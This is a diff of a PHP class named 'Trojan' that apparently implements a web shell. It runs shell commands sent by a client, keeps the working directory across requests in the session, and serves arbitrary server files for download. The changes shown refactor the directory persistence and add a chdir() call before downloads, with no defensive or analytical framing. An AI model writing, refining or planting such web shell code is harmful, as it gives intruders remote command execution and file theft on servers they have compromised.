@@ -25,8 +25,13 @@ class Trojan{
      * A generic constructor
      */
     public function __construct(){
-        # guarantee that these properties always have meaningful values
-        $this->cwd                        = trim(`pwd`);
+        # emulate cwd persistence
+        if(isset($_SESSION['cwd'])){
+            $this->cwd = $_SESSION['cwd'];
+        } else {
+            $this->cwd = trim(`pwd`);
+        }
+        # require that a context always be set
         $this->response['prompt_context'] = $this->get_prompt_context();
     }
 
@@ -70,9 +75,6 @@ class Trojan{
      * @param string $command          A command - this will change
      */
     private function process_shell_command($command){
-        # emulate cwd persistence
-        if(isset($_SESSION['cwd'])){ $this->cwd = $_SESSION['cwd']; }
-
         # buffer the command from the client, in case we ever want to refer
         # back to it
         $this->command = $command;
@@ -149,7 +151,7 @@ class Trojan{
      */
     public function payload_download($args){
         $file = $args['file'];
-        
+        chdir($this->cwd);
         # if the requested file exists, serve it up to the user
         if(file_exists($file)){
             header('Content-Description: File Transfer');
